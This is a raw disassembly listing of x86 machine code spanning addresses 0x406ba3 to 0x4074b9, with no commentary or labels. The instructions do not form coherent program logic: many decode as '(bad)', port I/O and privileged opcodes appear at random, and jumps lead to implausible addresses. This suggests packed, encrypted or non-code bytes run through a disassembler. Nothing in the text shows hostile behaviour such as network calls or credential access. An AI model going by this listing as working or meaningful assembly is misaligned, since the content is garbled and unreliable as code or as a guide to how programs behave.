  406ba3:	mov    ah,0xa7
  406ba5:	repnz popf 
  406ba7:	aaa    
  406ba8:	sub    ebx,ebx
  406baa:	pop    edi
  406bab:	in     al,0xbb
  406bad:	push   ebx
  406bae:	or     BYTE PTR [ecx-0x16b6b9bd],dl
  406bb4:	repnz lahf 
  406bb6:	shl    BYTE PTR [ecx-0x6b0a25b0],1
  406bbc:	ja     0x406bb0
  406bbe:	jne    0x406bc7
  406bc0:	sti    
  406bc1:	fstp   DWORD PTR [edi-0x25]
  406bc4:	cmp    edx,DWORD PTR [ebp+0x8]
  406bc7:	and    DWORD PTR [ebx],0xe2e94946
  406bcd:	lahf   
  406bce:	shl    BYTE PTR [ecx],1
  406bd0:	push   ecx
  406bd1:	(bad)  
  406bd3:	push   esp
  406bd4:	inc    eax
  406bd5:	repnz ins DWORD PTR es:[edi],dx
  406bd7:	xlat   BYTE PTR ds:[ebx]
  406bd8:	stos   BYTE PTR es:[edi],al
  406bd9:	fstp   DWORD PTR [edi-0x41]
  406bdc:	pop    esi
  406bdd:	push   ebp
  406bde:	or     BYTE PTR [ecx-0x2a],dl
  406be1:	inc    ebp
  406be2:	dec    ecx
  406be3:	jmp    0x406be8
	...
  406bf8:	mov    dl,0x9f
  406bfa:	shl    BYTE PTR [ecx],1
  406bfc:	push   ecx
  406bfd:	(bad)  
  406bff:	xor    al,0x10
  406c01:	repnz inc ebp
  406c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c04:	jp     0x406bdf
  406c06:	pop    edi
  406c07:	jmp    0x148c0e7
  406c0c:	inc    esi
  406c0d:	inc    ebp
  406c0e:	dec    ecx
  406c0f:	jmp    0x1110b76
  406c14:	popf   
  406c15:	iret   
  406c16:	idiv   dh
  406c18:	fcomp  st(5)
  406c1a:	out    dx,al
  406c1b:	arpl   WORD PTR ss:[edx-0x9],bp
  406c1f:	push   0x47c1e8
  406c24:	fisttp QWORD PTR [ebx+0x5b]
  406c27:	inc    ecx
  406c28:	mov    ch,0x6a
  406c2a:	cmp    eax,0xf6d0edd8
  406c2f:	(bad)  
  406c30:	fcomp  st(5)
  406c32:	out    dx,al
  406c33:	push   ds
  406c34:	push   ebx
  406c35:	push   0xfffffff7
  406c37:	push   0x47c1c7
  406c3c:	int    0x4b
  406c3e:	pop    ebx
  406c3f:	inc    ecx
  406c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c41:	push   0x3d
  406c43:	fdivr  DWORD PTR ds:0x18fef6d0
  406c49:	fucomp st(6)
  406c4b:	push   es
  406c4c:	mov    ds:0x7368f76a,eax
  406c51:	ret    
  406c52:	inc    edi
  406c53:	add    ch,bh
  406c55:	and    BYTE PTR [ebx+0x41],bl
  406c58:	jne    0x406c17
  406c5a:	or     BYTE PTR [eax],al
	...
  406c70:	gs adc eax,0x3d6d75f7
  406c76:	out    0xfd,eax
  406c78:	xor    ah,BYTE PTR [edi+0x60]
  406c7b:	add    BYTE PTR [ecx-0x2b],bh
  406c7e:	mul    BYTE PTR [edi-0x13]
  406c81:	ret    0x47
  406c84:	int    0x96
  406c86:	or     BYTE PTR [eax],al
  406c88:	mov    ch,0x67
  406c8a:	jge    0x406c94
  406c8c:	cmp    eax,0xe2fff548
  406c91:	mov    bh,0xb
  406c93:	push   esp
  406c94:	fs nop
  406c96:	pusha  
  406c97:	mov    ah,0xc6
  406c99:	aad    0xf6
  406c9b:	not    DWORD PTR [si-0x7ff8]
  406ca0:	mov    WORD PTR [edx],es
  406ca2:	inc    DWORD PTR [edi]
  406ca4:	in     al,0x2b
  406ca6:	addr16 (bad) 
  406ca8:	jmp    0x406c2c
  406caa:	sbb    dl,BYTE PTR [ebp+ecx*2-0x15]
  406cae:	shl    BYTE PTR [ebx+0x680cac3f],cl
  406cb4:	mov    gs,ebx
  406cb6:	or     al,BYTE PTR [eax-0x180d4835]
  406cbc:	div    BYTE PTR [edi]
  406cbe:	jmp    DWORD PTR gs:[ecx+edx*2]
  406cc2:	fld    DWORD PTR [eax-0x74]
  406cc5:	rol    DWORD PTR [eax+0x53],cl
  406cc8:	dec    ebp
  406cc9:	jmp    0x406c9d
  406ccb:	add    DWORD PTR [ebx+ebp*8-0xcde0076],ecx
  406cd2:	push   edx
  406cd3:	xchg   ebx,eax
	...
  406ce8:	xchg   ecx,eax
  406ce9:	test   eax,0x198c6865
  406cee:	retf   0xebff
  406cf1:	push   ebx
  406cf2:	fld    DWORD PTR [eax-0x74]
  406cf5:	adc    eax,0x6d8c0009
  406cfa:	gs jne 0x406c91
  406cfd:	test   eax,edi
  406cff:	cld    
  406d00:	arpl   di,dx
  406d02:	rol    BYTE PTR [eax+eax*8],cl
  406d05:	sub    al,0xb
  406d07:	push   0xffc9fb36
  406d0c:	mov    bl,0xeb
  406d0e:	or     al,BYTE PTR [eax]
  406d10:	or     al,0xb7
  406d12:	std    
  406d13:	pop    es
  406d14:	and    al,0x49
  406d16:	push   DWORD PTR [bp+di]
  406d19:	push   esi
  406d1a:	sbb    dl,BYTE PTR [ebp+ecx*8-0x13]
  406d1e:	rcr    cl,cl
  406d20:	mov    edi,0x8e680cac
  406d25:	in     eax,dx
  406d26:	or     al,BYTE PTR [eax-0x180b5eed]
  406d2c:	pop    edx
  406d2d:	xchg   esp,eax
  406d2e:	lods   al,BYTE PTR ds:[esi]
  406d2f:	ins    BYTE PTR es:[edi],dx
  406d30:	add    ebp,DWORD PTR [ebx+0xb]
  406d33:	ins    DWORD PTR es:[edi],dx
  406d34:	or     DWORD PTR [ecx+ecx*4-0x7a280e06],0xf3d7aed9
  406d3f:	sti    
  406d40:	jmp    0x406d19
  406d42:	jae    0x406db0
  406d44:	fld    TBYTE PTR [edx-0x23]
  406d47:	ins    BYTE PTR es:[edi],dx
  406d48:	pop    ecx
  406d49:	mov    WORD PTR [ecx+0x76],cs
	...
  406d5f:	add    cl,cl
  406d61:	xlat   BYTE PTR ds:[ebx]
  406d62:	ins    DWORD PTR es:[edi],dx
  406d63:	ins    BYTE PTR es:[edi],dx
  406d64:	cmp    eax,ebx
  406d66:	push   ebp
  406d67:	not    BYTE PTR [ebx-0x4cbbe514]
  406d6d:	xlat   BYTE PTR ds:[ebx]
  406d6e:	daa    
  406d6f:	inc    ecx
  406d70:	nop
  406d71:	xchg   esp,eax
  406d72:	xchg   esp,eax
  406d73:	js     0x406d25
  406d75:	adc    esi,DWORD PTR [edi+edi*8-0x243d9c65]
  406d7c:	cs inc eax
  406d7e:	mov    al,ds:0xfd618b03
  406d83:	pop    ebx
  406d84:	int    0xce
  406d86:	adc    eax,0xe16cdc6c
  406d8b:	add    esp,DWORD PTR [ebx+0x16]
  406d8e:	mov    cl,0x6c
  406d90:	loope  0x406d1e
  406d92:	sbb    DWORD PTR [ebx+0x5af5d774],esp
  406d98:	or     dl,dl
  406d9a:	std    
  406d9b:	imul   esp,esp,0x60
  406d9e:	popf   
  406d9f:	ret    0xd64b
  406da2:	push   ebx
  406da3:	clc    
  406da4:	sub    esi,DWORD PTR [edi+ebp*4+0x49443b6b]
  406dab:	add    eax,0xd486e78c
  406db0:	sub    ah,BYTE PTR [ecx-0x7]
  406db3:	pop    ebx
  406db4:	mov    ds:0x246bb5ec,eax
  406db9:	imul   ecx,DWORD PTR [eax],0x5fd7a7ab
  406dbf:	data16 fcom QWORD PTR [ebx+0x8]
  406dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  406dd8:	std    
  406dd9:	mov    ah,al
  406ddb:	sahf   
  406ddc:	dec    ebp
  406ddd:	xlat   BYTE PTR ds:[ebx]
  406dde:	idiv   BYTE PTR [ecx]
  406de0:	rcl    BYTE PTR [eax+ecx*1-0x8bbc982],1
  406de7:	cld    
  406de8:	out    0xee,eax
  406dea:	push   ebp
  406deb:	xchg   ecx,eax
  406dec:	xlat   BYTE PTR ds:[bx]
  406dee:	fbld   TBYTE PTR ds:0xa0f6d74a
  406df4:	push   edx
  406df5:	mov    WORD PTR [eax],cs
  406df7:	mov    esp,0xd4f6e842
  406dfc:	ret    
  406dfd:	out    dx,al
  406dfe:	pushf  
  406dff:	das    
  406e00:	daa    
  406e01:	xlat   BYTE PTR ds:[ebx]
  406e02:	add    ch,BYTE PTR [ecx]
  406e04:	pushf  
  406e05:	jl     0x406e67
  406e07:	mov    eax,ds:0x990853d3
  406e0c:	aaa    
  406e0d:	mov    ch,0xce
  406e0f:	ss daa 
  406e11:	inc    esp
  406e12:	pop    eax
  406e13:	cs jge 0x406da4
  406e16:	loopne 0x406dad
  406e18:	not    ch
  406e1a:	not    BYTE PTR [ecx]
  406e1c:	xchg   edx,edx
  406e1e:	not    BYTE PTR [esi]
  406e20:	mov    cl,0xd2
  406e22:	(bad)  
  406e23:	call   0x6b247964
  406e28:	int3   
  406e29:	hlt    
  406e2a:	popa   
  406e2b:	jmp    0xf658ce16
  406e30:	pop    esp
  406e31:	mov    dh,bh
  406e33:	mov    ah,0xd7
  406e35:	dec    esp
  406e36:	dec    ecx
  406e37:	jmp    0xdf0de923
	...
  406e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e51:	or     ecx,DWORD PTR [ebp-0x23]
  406e54:	push   ecx
  406e55:	(bad)  
  406e56:	cmc    
  406e57:	push   esp
  406e58:	jl     0x406e2f
  406e5a:	jl     0x406e5c
  406e5c:	sbb    DWORD PTR [ebx+0x3d],ebp
  406e5f:	fcomp  DWORD PTR [ebp-0x31]
  406e62:	mul    bh
  406e64:	and    DWORD PTR [ebp-0x9],edx
  406e67:	jmp    FWORD PTR [esp+edx*8-0xe]
  406e6b:	push   0xfffffff5
  406e6d:	push   0x7d
  406e6f:	sbb    BYTE PTR [edx],bl
  406e71:	in     eax,0x2
  406e73:	call   eax
  406e75:	dec    ecx
  406e76:	inc    eax
  406e77:	inc    ecx
  406e78:	cmc    
  406e79:	cmp    esi,esp
  406e7b:	les    ecx,FWORD PTR [edx]
  406e7d:	imul   eax,DWORD PTR [ecx+0x4d5d0d45],0xffffffe8
  406e84:	jne    0x406eef
  406e86:	jge    0x406ea4
  406e88:	cmp    ah,ah
  406e8a:	add    bh,bh
  406e8c:	mov    al,ds:0xa5414048
  406e91:	cmp    esi,ebx
  406e93:	les    ebx,FWORD PTR [edx+0x6a]
  406e96:	add    DWORD PTR [ebp+0x45],0xe0fef6b7
  406e9d:	mov    cl,0xf7
  406e9f:	jne    0x406e4a
  406ea1:	push   0x3d
  406ea3:	fsubr  st,st(5)
  406ea5:	shl    dh,1
  406ea7:	out    0xb5,eax
  406ea9:	xchg   ebp,eax
  406eaa:	idiv   edi
  406eac:	cld    
  406ead:	aam    0xe2
  406eaf:	lea    esi,[eax]
  406eb1:	jno    0x406f0b
  406eb3:	inc    DWORD PTR [eax]
	...
  406ec5:	add    BYTE PTR [eax],al
  406ec7:	add    BYTE PTR [eax],dl
  406ec9:	jne    0x406ec2
  406ecb:	jne    0x406f16
  406ecd:	push   0x3d
  406ecf:	fcomp  DWORD PTR ds:0xbde7f6d0
  406ed5:	xchg   ebp,eax
  406ed6:	idiv   edi
  406ed8:	in     al,dx
  406ed9:	aam    0xea
  406edb:	cmp    DWORD PTR [eax-0x4ef0f793],0x4
  406ee2:	or     BYTE PTR [eax],al
  406ee4:	and    eax,0x8cf87510
  406ee9:	jmp    0x406eda
  406eeb:	adc    DWORD PTR [esi],0xffffffeb
  406eee:	or     al,BYTE PTR [eax]
  406ef0:	(bad)  
  406ef2:	js     0x406ef4
  406ef4:	mov    ebp,DWORD PTR [edi-0x74]
  406ef7:	add    BYTE PTR [ebx+ebp*8+0x26b4755f],cl
  406efe:	out    0x7,eax
  406f00:	hlt    
  406f01:	xlat   BYTE PTR ds:[ebx]
  406f02:	mov    al,ds:0xe6f5fbff
  406f07:	sti    
  406f08:	repz ja 0x406eff
  406f0b:	out    0x78,eax
  406f0d:	inc    ebp
  406f0e:	popa   
  406f0f:	jmp    ebx
  406f11:	xlat   BYTE PTR ds:[ebx]
  406f12:	(bad)  
  406f13:	jmp    DWORD PTR [ecx-0x1d]
  406f16:	push   edx
  406f17:	popa   
  406f18:	adc    bl,BYTE PTR [esi+0x61]
  406f1b:	inc    DWORD PTR [ecx+0x5f]
  406f1e:	popa   
  406f1f:	jne    0x406eb5
  406f21:	inc    ebx
  406f22:	fidivr DWORD PTR [ebp+0x7d8b35bb]
  406f28:	fimul  DWORD PTR fs:[edx]
  406f2b:	out    dx,eax
	...
  406f40:	jmp    0x619b:0x19fefdbf
  406f47:	jne    0x406ecd
  406f49:	inc    ebx
  406f4a:	into   
  406f4b:	mov    ebp,0xe559d93
  406f50:	mov    ecx,DWORD PTR [ecx]
  406f52:	push   ebx
  406f53:	(bad)  
  406f54:	stc    
  406f55:	lods   eax,DWORD PTR ds:[esi]
  406f56:	popa   
  406f57:	jne    0x406edd
  406f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f5a:	or     bh,BYTE PTR [esi+0x7561ab73]
  406f60:	js     0x406f05
  406f62:	out    0x7,eax
  406f64:	je     0x406f49
  406f66:	mov    al,ds:0xef3f5bff
  406f6b:	jecxz  0x406ef9
  406f6d:	push   ecx
  406f6e:	push   es
  406f6f:	or     ecx,0xffffff9d
  406f72:	or     BYTE PTR [ebp-0x6d],dh
  406f75:	xchg   esp,eax
  406f76:	jp     0x406f36
  406f78:	das    
  406f79:	aam    0x10
  406f7b:	imul   edi,DWORD PTR [ecx-0x16683664],0x965cc5d3
  406f85:	ds loope 0x406ff0
  406f88:	mov    eax,ds:0xd1a3d99c
  406f8d:	sar    DWORD PTR [ebp-0x37377e98],cl
  406f93:	pusha  
  406f94:	int3   
  406f95:	shr    DWORD PTR [ebp-0x672f7e98],cl
  406f9b:	dec    eax
  406f9c:	int3   
  406f9d:	rcr    DWORD PTR [ebp-0x77339e98],cl
  406fa3:	push   eax
	...
  406fb8:	int3   
  406fb9:	ror    DWORD PTR [ebp-0x673b9e98],cl
  406fbf:	cmp    ah,cl
  406fc1:	sar    DWORD PTR [ebp+0x68],cl
  406fc4:	inc    ecx
  406fc5:	ror    BYTE PTR [eax+0x6dd3cc40],0x68
  406fcc:	inc    ecx
  406fcd:	mov    eax,0xd3cca858
  406fd2:	pop    ebp
  406fd3:	cmp    cl,dh
  406fd5:	js     0x406fb8
  406fd7:	into   
  406fd8:	push   ss
  406fd9:	rcr    DWORD PTR [edi+0x3f],0x9c
  406fdd:	retf   
  406fde:	xor    eax,0xe1a72468
  406fe3:	pop    eax
  406fe4:	dec    edx
  406fe5:	cmp    al,0x37
  406fe7:	iret   
  406fe8:	int3   
  406fe9:	xchg   esp,eax
  406fea:	cdq    
  406feb:	fs loopne 0x407043
  406fee:	loope  0x406fcb
  406ff0:	push   ecx
  406ff1:	push   0xe8f403a0
  406ff6:	mov    esp,0x3e3b63c2
  406ffb:	iret   
  406ffc:	int3   
  406ffd:	xchg   esp,eax
  406ffe:	cdq    
  406fff:	dec    edx
  407000:	mov    eax,0xb4e90855
  407005:	dec    ecx
  407006:	add    al,0xee
  407008:	xor    DWORD PTR [ebx-0x2c4daf20],ebx
  40700e:	not    BYTE PTR [ecx-0x61]
  407011:	xchg   esp,eax
  407012:	out    0x97,eax
  407014:	dec    eax
  407015:	sbb    BYTE PTR [ebp+0x28],0x88
  407019:	cmp    al,0x22
  40701b:	sbb    al,0x0
	...
  40702d:	add    BYTE PTR [eax],al
  40702f:	add    BYTE PTR [ecx-0x2d],dl
  407032:	outs   dx,BYTE PTR ds:[esi]
  407033:	fistp  QWORD PTR [esp+edx*2]
  407036:	or     BYTE PTR [ecx+0xa],al
  407039:	push   0xcce7e949
  40703e:	pop    ebx
  40703f:	sub    BYTE PTR [eax-0x36cbe5c4],dl
  407045:	shl    ch,cl
  407047:	sbb    al,0xe4
  407049:	sar    DWORD PTR [ecx+eiz*8+0x47],1
  40704d:	(bad)  
  40704e:	test   BYTE PTR [esi-0x16e3c38d],0x3a
  407055:	adc    ah,BYTE PTR [eax+0x66]
  407058:	fst    QWORD PTR [ebx+0x8]
  40705b:	add    DWORD PTR [edx-0x2816b699],ebp
  407061:	aas    
  407062:	pop    ebp
  407063:	test   al,0x8f
  407065:	cmp    al,0x43
  407067:	mov    esp,0x136ed2d0
  40706c:	mov    ebp,0xd3d10853
  407071:	addr16 dec ecx
  407073:	jmp    0x3644b9a2
  407078:	jge    0x407014
  40707a:	loopne 0x407058
  40707c:	jmp    0x4db56752
  407081:	into   
  407082:	push   edi
  407083:	push   ds
  407084:	jge    0x407024
  407086:	neg    esp
  407088:	xlat   BYTE PTR ds:[ebx]
  407089:	pop    esp
  40708a:	dec    ecx
  40708b:	jmp    0xe4cd57
  407090:	gs xchg esi,eax
  407092:	add    eax,eax
	...
  4070a8:	fdivr  DWORD PTR [ebx-0x69c2ba33]
  4070ae:	or     BYTE PTR [eax],al
  4070b0:	xor    eax,0x32f44d93
  4070b5:	shl    esi,cl
  4070b7:	(bad)  
  4070b8:	fistp  WORD PTR [eax-0x6730ff9e]
  4070be:	bound  eax,QWORD PTR [eax]
  4070c0:	rcl    ah,0xfa
  4070c3:	push   eax
  4070c4:	mov    al,ds:0xd2f7fc14
  4070c9:	cmp    bl,BYTE PTR [eax-0x1]
  4070cc:	enter  0xf740,0x75
  4070d0:	xor    DWORD PTR [esi+0x16],ebp
  4070d3:	lods   al,BYTE PTR ds:[esi]
  4070d4:	in     eax,0x95
  4070d6:	add    eax,eax
  4070d8:	cdq    
  4070d9:	xchg   esi,eax
  4070da:	jecxz  0x40711c
  4070dc:	lea    eax,[eax+eax*2]
  4070df:	inc    ecx
  4070e0:	cmc    
  4070e1:	cmp    bh,BYTE PTR [ebp+0xc]
  4070e4:	std    
  4070e5:	ret    
  4070e6:	leave  
  4070e7:	call   DWORD PTR [edx+0x4e]
  4070ea:	fmul   DWORD PTR [ebp-0xbec8]
  4070f0:	xor    ah,ch
  4070f2:	pop    eax
  4070f3:	call   0x37c812
  4070f8:	cmp    al,0x14
  4070fa:	clc    
  4070fb:	test   DWORD PTR [edx+0x3a],0x4245b5f7
  407102:	idiv   edi
  407104:	push   edx
  407105:	les    ecx,FWORD PTR [esi]
  407107:	call   0x37a864
	...
  407120:	ret    0xf804
  407123:	div    DWORD PTR [edx-0xd5a1fc6]
  407129:	cmp    dh,bh
  40712b:	jmp    FWORD PTR [eax]
  40712d:	cmp    eax,0xaa8c95e3
  407132:	clc    
  407133:	sti    
  407134:	je     0x4071ad
  407136:	xchg   edx,eax
  407137:	add    BYTE PTR [esp+eax*4+0x288c0849],cl
  40713e:	jb     0x40712c
  407140:	movq   QWORD PTR [edi+0x6a],mm5
  407144:	mov    WORD PTR ds:0xc3c1fef5,ss
  40714a:	push   edx
  40714b:	mov    edx,0x896cf1f0
  407150:	shl    edi,1
  407152:	rcl    DWORD PTR [ebp-0xf38348],cl
  407158:	mov    eax,ds:0x12b752c3
  40715d:	adc    ch,BYTE PTR [ebp+0x6a]
  407160:	mov    WORD PTR [ebx+0x49],ss
  407163:	push   esp
  407164:	dec    ebp
  407165:	mov    ebx,0x7c6095d2
  40716a:	or     al,0xff
  40716c:	mov    ecx,0x8c40b3d3
  407171:	adc    edi,ecx
  407173:	shl    ebx,0x21
  407176:	icebp  
  407177:	mov    edi,0x4fdaca60
  40717c:	rol    edi,cl
  40717e:	repnz out 0x21,eax
  407181:	inc    edi
  407182:	ins    DWORD PTR es:[edi],dx
  407183:	inc    DWORD PTR [eax]
	...
  407195:	add    BYTE PTR [eax],al
  407197:	add    BYTE PTR [edx+esi*2-0x1b440053],dh
  40719e:	or     ch,BYTE PTR [eax-0x6]
  4071a1:	add    cl,dl
  4071a3:	push   DWORD PTR [ebx]
  4071a5:	adc    al,0xd8
  4071a7:	inc    eax
  4071a8:	mov    WORD PTR [edx+0x27],fs
  4071ab:	fadd   DWORD PTR [esp+edi*8+0xa]
  4071af:	call   0xffadeef9
  4071b4:	xchg   edi,eax
  4071b5:	jge    0x4071af
  4071b7:	push   cs
  4071b8:	fsubr  QWORD PTR ds:0x9484756c
  4071be:	sbb    ecx,ebx
  4071c0:	ja     0x407192
  4071c2:	adc    eax,0x1e0f8a5c
  4071c7:	not    BYTE PTR gs:[ecx+ecx*4-0x1eaa3fc0]
  4071cf:	(bad)  
  4071d1:	push   0x92b403a0
  4071d6:	loope  0x4071db
  4071d8:	or     al,0xbd
  4071da:	rol    BYTE PTR [ecx+0x3b],0xd0
  4071de:	stc    
  4071df:	inc    ebx
  4071e0:	mov    eax,0x2ad4319f
  4071e5:	dec    edx
  4071e6:	jmp    0xc6114046
  4071eb:	fs and al,0xca
  4071ee:	mov    fs,WORD PTR [ebx+edx*1+0x3b]
  4071f2:	loope  0x4071cf
  4071f4:	inc    ecx
  4071f5:	pop    ebp
  4071f6:	and    BYTE PTR [esp+esi*2],al
  4071f9:	std    
  4071fa:	sbb    al,0xc3
	...
  407210:	sti    
  407211:	aaa    
  407212:	jecxz  0x407217
  407214:	mov    WORD PTR [ecx+ebx*4],ss
  407217:	ins    BYTE PTR es:[edi],dx
  407218:	int    0xcf
  40721a:	popf   
  40721b:	clc    
  40721c:	and    ecx,DWORD PTR [ecx-0x2a]
  40721f:	ror    DWORD PTR [ebx-0x31],cl
  407222:	repz sti 
  407224:	jmp    0x4071d3
  407226:	jne    0x40728c
  407228:	retf   
  407229:	mov    esp,0xcfc3a5ac
  40722e:	or     cl,BYTE PTR [edx]
  407230:	mov    ebx,0x365bf949
  407235:	rcl    BYTE PTR [ebp+0x64],1
  407238:	ss jae 0x407299
  40723b:	out    dx,al
  40723c:	mov    edi,DWORD PTR [eax+edx*8-0x25306499]
  407243:	pop    es
  407244:	xchg   ebx,eax
  407245:	dec    ecx
  407246:	stc    
  407247:	pop    ebx
  407248:	repnz rol BYTE PTR [edi],1
  40724b:	ss call 0xf06def20
  407251:	dec    ecx
  407252:	add    BYTE PTR [ecx],dl
  407254:	scas   al,BYTE PTR es:[edi]
  407255:	adc    bh,dh
  407257:	push   ds
  407258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407259:	ror    BYTE PTR [ebx],cl
  40725b:	jmp    0x6b248cb2
  407260:	fwait
  407261:	rcr    BYTE PTR [ebp-0x62],1
  407264:	xor    eax,0xb0e660cf
  407269:	dec    ecx
  40726a:	add    BYTE PTR [ecx],al
  40726c:	int3   
  40726d:	or     esi,edi
  40726f:	out    dx,al
  407270:	mov    ch,0x59
  407272:	hlt    
  407273:	jb     0x407275
	...
  407285:	add    BYTE PTR [eax],al
  407287:	add    BYTE PTR [ebp-0x6fd7bf90],dl
  40728d:	sbb    esi,DWORD PTR ds:0x8545049
  407293:	imul   ebp,DWORD PTR [edi-0x6c],0x2f203a7c
  40729a:	pop    ebp
  40729b:	sub    BYTE PTR [eax+0x32c9e067],dl
  4072a1:	xchg   esp,eax
  4072a2:	or     dl,ah
  4072a4:	dec    edi
  4072a5:	dec    eax
  4072a6:	pop    ss
  4072a7:	aas    
  4072a8:	pusha  
  4072a9:	mov    al,al
  4072ab:	sahf   
  4072ac:	outs   dx,DWORD PTR ds:[esi]
  4072ad:	fs pusha 
  4072af:	jmp    0x1f63243
  4072b4:	sub    al,0x69
  4072b6:	dec    ecx
  4072b7:	jmp    0xf1bd40db
  4072bc:	aaa    
  4072bd:	push   esp
  4072be:	out    dx,eax
  4072bf:	jbe    0x4072f0
  4072c1:	mov    esp,0xcf2f2f40
  4072c6:	pop    edi
  4072c7:	xchg   edi,eax
  4072c8:	cmc    
  4072c9:	push   ebx
  4072ca:	or     BYTE PTR [esi-0x165dfdc9],dh
  4072d0:	(bad)  
  4072d1:	fwait
  4072d2:	enter  0x8ed5,0x66
  4072d6:	loopne 0x4072d8
  4072d8:	mov    ds:0x25fff75a,eax
  4072dd:	mov    edx,0xf2cafff6
  4072e2:	pop    edi
  4072e3:	mov    esp,0x4ff6d920
  4072e8:	stos   BYTE PTR es:[edi],al
  4072e9:	jmp    0x4072f9
  4072eb:	call   0x4072f0
	...
  407300:	addr16 cmp esi,edi
  407303:	dec    DWORD PTR [ebp-0x75004b33]
  407309:	cmp    eax,0x72e54609
  40730e:	or     BYTE PTR [ebp-0x71],dh
  407311:	(bad)  
  407313:	xor    esi,DWORD PTR [ebp+0x2f]
  407316:	idiv   edi
  407318:	sub    dh,BYTE PTR [ebx]
  40731a:	cli    
  40731b:	scas   al,BYTE PTR es:[edi]
  40731c:	ins    DWORD PTR es:[edi],dx
  40731d:	cdq    
  40731e:	jge    0x4072ad
  407320:	dec    edx
  407321:	in     eax,dx
  407322:	repnz inc eax
  407325:	mov    al,ds:0x32fe77e0
  40732a:	neg    DWORD PTR [edi+0x6b]
  40732d:	pop    edi
  40732e:	retf   0xf504
  407331:	or     al,0x82
  407333:	in     al,dx
  407334:	dec    ebp
  407335:	cwde   
  407336:	or     bh,ch
  407338:	imul   edi,DWORD PTR [ecx-0x675baa2c],0xfffffff7
  40733f:	jne    0x40733a
  407341:	xor    bh,BYTE PTR [ebp+0x8]
  407344:	or     eax,0xaffee65
  407349:	mov    edx,0xf3fa0007
  40734e:	pop    edi
  40734f:	jecxz  0x4072f1
  407351:	xlat   BYTE PTR ds:[ebx]
  407352:	idiv   dh
  407354:	rcr    BYTE PTR [ebp+0x39ad75f7],0xb0
  40735b:	out    0x2a,al
  40735d:	xor    al,cl
  40735f:	ret    0x919d
  407362:	pop    ebp
  407363:	mov    eax,DWORD PTR [eax]
	...
  407375:	add    BYTE PTR [eax],al
  407377:	add    BYTE PTR [edi+edx*2+0x5388756a],cl
  40737e:	sbb    al,dl
  407380:	xchg   ebx,eax
  407381:	push   esi
  407382:	push   es
  407383:	rol    BYTE PTR [eax],0xb2
  407386:	loop   0x40734f
  407388:	frndint 
  40738a:	or     dl,BYTE PTR [eax+0x64]
  40738d:	bound  ecx,QWORD PTR [edi+edi*8+0x73]
  407391:	or     edi,DWORD PTR [ebx+0x62c3e1fe]
  407397:	stos   DWORD PTR es:[edi],eax
  407398:	arpl   WORD PTR [esi+0x5ff5e86a],sp
  40739e:	push   0xffffffff
  4073a0:	inc    ebp
  4073a1:	jns    0x4073a6
  4073a3:	add    cl,ah
  4073a5:	inc    edx
  4073a6:	or     DWORD PTR [bx+si-0x39],0xffffffe3
  4073ab:	jmp    DWORD PTR [ebp-0x7b8a964d]
  4073b1:	jecxz  0x407347
  4073b3:	mov    edx,0x4582ee2b
  4073b8:	and    BYTE PTR [ecx+0xc],dl
  4073bb:	push   0xffcb84d7
  4073c0:	stos   DWORD PTR es:[edi],eax
  4073c1:	jecxz  0x407381
  4073c3:	inc    eax
  4073c4:	mov    WORD PTR [esi],cs
  4073c6:	pop    ds
  4073c7:	fcom   DWORD PTR [esp+edi*2+0xc]
  4073cb:	call   0xffa96edd
  4073d0:	xchg   ebx,edi
  4073d2:	iret   
  4073d3:	adc    edi,DWORD PTR [ebx+eiz*4]
  4073d6:	or     eax,DWORD PTR [eax]
  4073d8:	repz fs mov esp,0xfe
	...
  4073ef:	add    BYTE PTR [ecx-0x4d],ah
  4073f2:	bound  esp,QWORD PTR [ebx-0x11]
  4073f5:	adc    eax,0x905de869
  4073fa:	imul   edi,edi,0xbae2bb36
  407400:	bound  edi,QWORD PTR [esp+ecx*1+0x68]
  407404:	adc    DWORD PTR [edi+esi*4+0x1bcdabc2],0xe153543c
  40740f:	imul   edi,DWORD PTR [esi],0xffffffd4
  407412:	inc    ebp
  407413:	popa   
  407414:	xchg   esp,edx
  407416:	mov    ah,0xf7
  407418:	fstp   TBYTE PTR [eax+eiz*8]
  40741b:	add    esi,DWORD PTR [ebx+0xb]
  40741e:	xchg   ecx,eax
  40741f:	pusha  
  407420:	add    DWORD PTR [ebp-0x3390e7b7],ebx
  407426:	sub    eax,0x1609ae6c
  40742b:	popa   
  40742c:	not    BYTE PTR [ecx+ecx*4-0x1eaa3db4]
  407433:	jmp    0x4073ff
  407435:	bound  esp,QWORD PTR [eax+0x29824b03]
  40743b:	int3   
  40743c:	int3   
  40743d:	xchg   esp,eax
  40743e:	or     DWORD PTR ds:0xce5cc4c,esp
  407444:	dec    esp
  407445:	inc    ecx
  407446:	(bad)  
  407447:	mov    bl,0xdb
  407449:	retf   
  40744a:	pop    ebx
  40744b:	or     al,0x34
  40744d:	lahf   
  40744e:	fisub  WORD PTR [eax+0x1b]
  407451:	mov    ebp,0x9fd8
	...
  407466:	add    BYTE PTR [eax],al
  407468:	adc    ecx,esp
  40746a:	pop    edx
  40746b:	add    al,0x74
  40746d:	fistp  WORD PTR [esi]
  40746f:	ret    
  407470:	add    esi,DWORD PTR [esi+ecx*2]
  407473:	mov    edx,0x16a6944c
  407478:	aam    0x5c
  40747a:	and    BYTE PTR [esp+esi*8],al
  40747d:	int    0x55
  40747f:	pusha  
  407480:	jecxz  0x407421
  407482:	mov    eax,ds:0x31648ad7
  407487:	popa   
  407488:	pop    ecx
  407489:	pushf  
  40748a:	cdq    
  40748b:	arpl   dx,cx
  40748d:	retf   
  40748e:	jne    0x4074fb
  407490:	ror    BYTE PTR [eax],cl
  407492:	or     BYTE PTR [esi+0x2c],dh
  407495:	or     BYTE PTR ds:[ecx],al
  407498:	je     0x4074fc
  40749a:	dec    ecx
  40749b:	jmp    0xa89e7457
  4074a0:	(bad)  
  4074a1:	retf   
  4074a2:	cmp    al,0x31
  4074a4:	(bad)  
  4074a5:	push   esp
  4074a6:	or     BYTE PTR [ecx+0x3c],al
  4074a9:	or     esi,edi
  4074ab:	inc    esi
  4074ac:	cwde   
  4074ad:	aam    0x7b
  4074af:	out    dx,al
  4074b0:	aas    
  4074b1:	pop    ebx
  4074b2:	idiv   DWORD PTR [edi+eax*4-0x13d04244]
  4074b9:	retf   
